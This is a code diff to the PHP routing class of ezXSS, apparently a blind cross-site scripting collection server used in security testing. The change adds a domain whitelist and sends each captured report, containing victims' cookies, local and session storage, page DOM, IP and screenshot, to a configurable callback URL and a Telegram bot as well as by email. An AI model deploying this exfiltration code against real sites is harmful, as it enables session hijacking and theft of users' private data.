@@ -159,7 +159,15 @@ class Route
                 explode(',', $setting['blocked-domains']),
                 true
             )) {
-            return 'github.com/ssl/ezXSS';
+            return 'github.com/ssl/ezXSS1';
+        }
+
+        if ($setting['whitelist-domains'] !== '' && $json->origin !== $setting['whitelist-domains'] && in_array(
+                $json->origin,
+                explode(',', $setting['whitelist-domains']),
+                true) === false
+        ) {
+            return 'github.com/ssl/ezXSS2';
         }
 
         $doubleReport = false;
@@ -224,55 +232,93 @@ class Route
             );
 
             if (($doubleReport && $setting['filter-alert'] == 1) || (!$doubleReport)) {
-                if (!empty($json->screenshot)) {
-                    $json->screenshot = $this->basic->screenshotPath($screenshotName);
+                if($setting['alert-callback'] === '1') {
+                    $cb = curl_init((parse_url($setting['callback-url'], PHP_URL_SCHEME) ? '' : 'https://') . $setting['callback-url']);
+                    curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
+                    curl_setopt($cb, CURLOPT_POSTFIELDS, $phpInput);
+                    curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+                    curl_exec($cb);
                 }
 
-                $htmlTemplate = str_replace(
-                    [
-                        '{{id}}',
-                        '{{domain}}',
-                        '{{url}}',
-                        '{{ip}}',
-                        '{{referer}}',
-                        '{{payload}}',
-                        '{{user-agent}}',
-                        '{{cookies}}',
-                        '{{localstorage}}',
-                        '{{sessionstorage}}',
-                        '{{dom}}',
-                        '{{origin}}',
-                        '{{time}}',
-                        '{{screenshot}}'
-                    ],
-                    [
-                        $reportId,
-                        htmlspecialchars($domain),
-                        htmlspecialchars($json->uri),
-                        htmlspecialchars($userIp),
-                        htmlspecialchars($json->referer),
-                        htmlspecialchars($json->payload),
-                        htmlspecialchars($json->{'user-agent'}),
-                        htmlspecialchars($json->cookies),
-                        htmlspecialchars(json_encode($json->localstorage)),
-                        htmlspecialchars(json_encode($json->sessionstorage)),
-                        htmlspecialchars(substr($json->dom, 0, $setting['dompart'])) . $domExtra,
-                        htmlspecialchars($json->origin),
-                        date('F j Y, g:i a'),
-                        $json->screenshot
-                    ],
-                    $this->basic->htmlBlocks('mail')
-                );
+                if($setting['alert-telegram'] === '1') {
+                    if (!empty($json->screenshot)) {
+                        $json->screenshot = $this->basic->screenshotPath($screenshotName);
+                    }
 
-                $headers[] = 'From: ' . $setting['emailfrom'];
-                $headers[] = 'MIME-Version: 1.0';
-                $headers[] = 'Content-type: text/html; charset=iso-8859-1';
-                mail(
-                    $setting['email'],
-                    '[ezXSS] XSS on ' . htmlspecialchars($json->uri),
-                    $htmlTemplate,
-                    implode("\r\n", $headers)
-                );
+                    $markdownTemplate = str_replace(
+                        [
+                            '{{id}}', '{{domain}}', '{{url}}', '{{ip}}',
+                            '{{referer}}', '{{payload}}', '{{user-agent}}', '{{cookies}}', '{{localstorage}}',
+                            '{{sessionstorage}}', '{{dom}}', '{{origin}}', '{{time}}', '{{screenshot}}'
+                        ],
+                        [
+                            $reportId, $domain, $json->uri, $userIp, $json->referer !== '' ? $json->referer : ' ', $json->payload,
+                            $json->{'user-agent'}, $json->cookies, json_encode($json->localstorage), json_encode($json->sessionstorage),
+                            substr($json->dom, 0, $setting['dompart']) . $domExtra, $json->origin, date('F j Y, g:i a'), $json->screenshot !== '' ? $json->screenshot : ' '
+                        ],
+                        $this->basic->htmlBlocks('telegram')
+                    );
+
+                    $cb = curl_init('https://api.telegram.org/bot' . $setting['telegram-bottoken'] . '/sendMessage');
+                    curl_setopt($cb, CURLOPT_CUSTOMREQUEST, 'POST');
+                    curl_setopt($cb, CURLOPT_POSTFIELDS, json_encode(['chat_id' => $setting['telegram-chatid'], 'parse_mode' => 'markdown', 'text' => $markdownTemplate]));
+                    curl_setopt($cb, CURLOPT_RETURNTRANSFER, true);
+                    curl_setopt($cb, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
+                    curl_exec($cb);
+                }
+
+                if($setting['alert-mail'] === '1') {
+                    if (!empty($json->screenshot)) {
+                        $json->screenshot = $this->basic->screenshotPathImg($screenshotName);
+                    }
+
+                    $htmlTemplate = str_replace(
+                        [
+                            '{{id}}',
+                            '{{domain}}',
+                            '{{url}}',
+                            '{{ip}}',
+                            '{{referer}}',
+                            '{{payload}}',
+                            '{{user-agent}}',
+                            '{{cookies}}',
+                            '{{localstorage}}',
+                            '{{sessionstorage}}',
+                            '{{dom}}',
+                            '{{origin}}',
+                            '{{time}}',
+                            '{{screenshot}}'
+                        ],
+                        [
+                            $reportId,
+                            htmlspecialchars($domain),
+                            htmlspecialchars($json->uri),
+                            htmlspecialchars($userIp),
+                            htmlspecialchars($json->referer),
+                            htmlspecialchars($json->payload),
+                            htmlspecialchars($json->{'user-agent'}),
+                            htmlspecialchars($json->cookies),
+                            htmlspecialchars(json_encode($json->localstorage)),
+                            htmlspecialchars(json_encode($json->sessionstorage)),
+                            htmlspecialchars(substr($json->dom, 0, $setting['dompart'])) . $domExtra,
+                            htmlspecialchars($json->origin),
+                            date('F j Y, g:i a'),
+                            $json->screenshot
+                        ],
+                        $this->basic->htmlBlocks('mail')
+                    );
+
+                    $headers[] = 'From: ' . $setting['emailfrom'];
+                    $headers[] = 'MIME-Version: 1.0';
+                    $headers[] = 'Content-type: text/html; charset=iso-8859-1';
+                    mail(
+                        $setting['email'],
+                        '[ezXSS] XSS on ' . htmlspecialchars($json->uri),
+                        $htmlTemplate,
+                        implode("\r\n", $headers)
+                    );
+                }
             }
         }
 
